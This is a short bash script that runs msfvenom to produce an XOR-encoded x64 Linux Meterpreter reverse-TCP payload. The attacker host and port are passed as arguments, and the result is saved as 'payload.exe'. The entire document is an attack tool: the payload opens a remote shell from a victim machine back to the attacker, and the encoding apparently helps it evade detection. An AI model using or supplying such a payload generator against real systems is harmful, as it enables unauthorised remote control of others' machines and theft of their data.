#!/bin/bash
msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp -e x64/xor_dynamic LPORT=$2 LHOST=$1 -f elf > payload.exe
